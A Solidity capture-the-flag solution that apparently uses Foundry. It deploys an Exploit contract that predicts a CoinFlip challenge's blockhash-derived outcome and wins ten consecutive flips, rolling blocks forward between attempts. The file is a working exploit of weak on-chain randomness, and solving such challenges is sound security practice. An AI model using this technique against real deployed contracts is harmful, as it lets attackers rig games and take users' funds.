// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/Chall.sol";
import {Vm} from "forge-std/Vm.sol";

function playerScript(address _target, Vm vm) {
    CoinFlip target = CoinFlip(_target);
    Exploit exploit = new Exploit(target);
    int256 i = 0;

    while (target.consecutiveWins() < 10) {
        vm.roll(uint256(i + 10));
        exploit.attack();
        i++;
    }
}

contract Exploit {
    CoinFlip target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    event returnVal(bool _val);

    constructor(CoinFlip _target) {
        target = _target;
    }

    function getBlockValue() internal view returns (uint256) {
        uint256 res = uint256(blockhash(block.number - 1));
        return res;
    }

    function attack() public payable {
        uint256 blockValue = getBlockValue() / FACTOR;
        bool side = blockValue == 1 ? true : false;
        bool res = target.flip(side);
        emit returnVal(res);
        if (!res) {
            revert();
        }
    }
}
